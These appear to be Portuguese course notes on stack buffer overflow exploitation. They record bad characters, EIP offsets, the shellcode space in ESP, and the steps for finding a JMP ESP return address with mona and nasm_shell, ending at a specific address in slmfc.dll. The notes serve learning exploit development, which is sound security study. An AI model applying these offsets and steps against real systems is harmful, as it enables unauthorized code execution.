bad chars - caracteres invalidos:
\x00\x0a\x0d\x20

#Ensinado no curso
2606 + 4 = EIP

#Meus testes
2607 + 4 = EIP

#espaco do shell code em ESP

#Ensinado no curso
390 bytes para o shell code no ESP

#meus testes
389 bytes para o shell code no ESP


EIP precisa apontar para o ESP que onde esta o shell code, fluxo:
EIP ======> ESP ======> shellcode ======> Acesso :)

Achar um JMP ESP, ou seja, localizar um endereco de retorno que contenha um JMP ESP para apontarmos no EIP

EX:
shell32.dll -> JMP ESP no endereco 7CA6774B

Para buscar por linha de comando:
#Listando todos os modulos carregados, na area de comando do debbuger digitar o comando abaixo
!mona modules

#Descobrir o opcode de JMP ESP, para isso abra um terminal no kali ou sua distro com meta exploit e execute
#Para achar o nasm_shell use o locate
locate nasm_shell

#Depois pegue o caminho abosuluto e execute
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

#Quando o shell liberar digite
jmp esp

#REsultado sera semelhante a esse:
# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > 

#Depois buscar no debbuger novamente o opcode
!mona find -s '"\xFF\xE4"' -m slmfc.dll

#Poderia ser qualquer um dos resultados, mas preferivel escolher um endereco que nao tenha nenhuma protecao de memoria (ASLR e DEP), endereco de memoria sem bad chars 
Log data, item 145
Address=5F4A358F Message=  0x5f4a358f : '"\xFF\xE4"' |  {PAGE_READONLY} [SLMFC.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.8063.0 (C:\WINDOWS\system32\SLMFC.DLL)

#Clicar com o direito escolher a opcao 'dump at address' e depois clicar com direito 'Disassemble', o resultado sera como o abaixo :
5F4A358F   FFE4             JMP ESP

#Endereco
slmfc.dll -> 5F4A358F

